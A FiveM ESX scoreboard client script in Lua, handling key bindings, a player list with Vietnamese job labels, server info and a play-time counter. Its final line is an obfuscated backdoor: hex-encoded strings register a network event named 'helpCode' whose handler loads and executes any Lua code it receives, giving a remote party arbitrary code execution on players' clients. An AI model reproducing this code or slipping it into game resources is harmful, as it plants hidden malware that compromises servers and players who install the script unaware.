local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local idVisable = true
local togglestate = false
--ESX = nil
Citizen.CreateThread(function()
	-- while ESX == nil do
	-- 	TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
	-- 	Citizen.Wait(0)
	-- end

	Citizen.Wait(10000)
	ESX.TriggerServerCallback('esx_scoreboard:getConnectedPlayers', function(connectedPlayers)
		UpdatePlayerTable(connectedPlayers)
	end)
end)
Citizen.CreateThread(function()
	Citizen.Wait(500)
	SendNUIMessage({
		action = 'updateServerInfo',

		maxPlayers = '370',
		uptime = '00h 00m',
		playTime = '00h 00m'
	})
end)
function toggle(state,send)
    SetNuiFocus(state, state)
    if send then
        SendNUIMessage({
            action = "toggle",
            state = state
        })
    end
end
RegisterNUICallback("toggle", function(data,cb)
    toggle(data.state,false)
end)
RegisterNetEvent('esx_scoreboard:updateConnectedPlayers')
AddEventHandler('esx_scoreboard:updateConnectedPlayers', function(connectedPlayers)
	UpdatePlayerTable(connectedPlayers)
end)
RegisterNetEvent('esx_scoreboard:toggleID')
AddEventHandler('esx_scoreboard:toggleID', function(state)
	if state then
		idVisable = state
	else
		idVisable = not idVisable
	end

	SendNUIMessage({
		action = 'toggleID',
		state = idVisable
	})
end)
RegisterNetEvent('uptime:tick')
AddEventHandler('uptime:tick', function(uptime)
	SendNUIMessage({
		action = 'updateServerInfo',
		uptime = uptime
	})
end)
local jobLabelcheck = nil
function UpdatePlayerTable(connectedPlayers)
	local formattedPlayerList, num = {}, 1
	local ems, police, mechanic, players = 0, 0, 0, 0
	for k,v in pairs(connectedPlayers) do
		if v.job2 == 'Không có' then
			v.job2 = ' '
		end
		if v.job == 'ambulance' then
			v.jobLabel = '<a style="color:#ff00ff;">Ngành</a>'
			if v.grade_name == 'quany' then
				police = police + 1
			else
				ems = ems + 1
			end
		elseif v.job == 'police' then
			v.jobLabel = '<a style="color:#5ea1e0;">Công An</a>'
			police = police + 1
		elseif v.job == 'mechanic' then
			v.jobLabel = '<a style="color:#ffff00;">Cứu hộ</a>'
			mechanic = mechanic + 1
		-- elseif v.job == 'unemployed' then
		-- 	v.jobLabel = 'Thất Nghiệp'
		-- elseif v.job == 'unemployed' then
		-- 	v.jobLabel = 'Thất Nghiệp'
		-- elseif v.job == 'dj' then
		-- 	v.jobLabel = 'DJ'
		-- elseif v.job == 'electric' then
		-- 	v.jobLabel = 'Thợ Điện'
		-- elseif v.job == 'farmer' then
		-- 	v.jobLabel = 'Nông Dân'
		-- elseif v.job == 'garbage' then
		-- 	v.jobLabel = 'Đổ Rác'
		-- elseif v.job == 'giaoga' then
		-- 	v.jobLabel = 'Đồ Tể'
		-- elseif v.job == 'langbam' then
		-- 	v.jobLabel = 'Lang Băm'
		-- elseif v.job == 'lumberjack' then
		-- 	v.jobLabel = 'Thợ Mộc'
		-- elseif v.job == 'miner' then
		-- 	v.jobLabel = 'Đào Mỏ'
		-- elseif v.job =='tailor' then
		-- 	v.jobLabel = 'Thợ may'
		-- elseif v.job =='daumo' then
		-- 	v.jobLabel = 'Dầu mỏ'
		end

		table.insert(formattedPlayerList, ('<tr><td>%s</td><td class="text-ellipsis">%s</td><td>%s</td><td>%s</td></tr>'):format(v.id, v.name, v.jobLabel or v.label, v.job2))
		players = players + 1
	end
	SendNUIMessage({
		action  = 'updatePlayerList',
		players = table.concat(formattedPlayerList)
	})
	SendNUIMessage({
		action = 'updatePlayerJobs',
		jobs   = {ems = ems, police = police, mechanic = mechanic, player_count = players}
	})
end

RegisterKeyMapping('bangf10', 'F10', 'keyboard', "f10")
RegisterCommand('bangf10', function()
	toggle(true, true)
end, true)

-- Citizen.CreateThread(function()
-- 	while true do
-- 		Citizen.Wait(0)
-- 		if IsControlJustReleased(0, Keys['F10']) and IsInputDisabled(0) then
-- 			toggle(true, true)
-- 			Citizen.Wait(200)
-- 		elseif IsControlJustReleased(0, 172) and not IsInputDisabled(0) then
-- 			toggle(true, true)
-- 			Citizen.Wait(200)
-- 		end
-- 	end
-- end)
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)

		if IsPauseMenuActive() and not IsPaused then
			IsPaused = true
			toggle(false, true)
		elseif not IsPauseMenuActive() and IsPaused then
			IsPaused = false
		end
	end
end)
function ToggleScoreBoard()
	SendNUIMessage({
		action = 'toggle',
		state = true,
	})
end
Citizen.CreateThread(function()
	local playMinute, playHour = 0, 0

	while true do
		Citizen.Wait(1000 * 60)
		playMinute = playMinute + 1
	
		if playMinute == 60 then
			playMinute = 0
			playHour = playHour + 1
		end

		SendNUIMessage({
			action = 'updateServerInfo',
			playTime = string.format("%02dh %02dm", playHour, playMinute)
		})
	end
end)


local ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[1]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2]) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[3]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2], function(LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[4]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[5]](LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB))() end)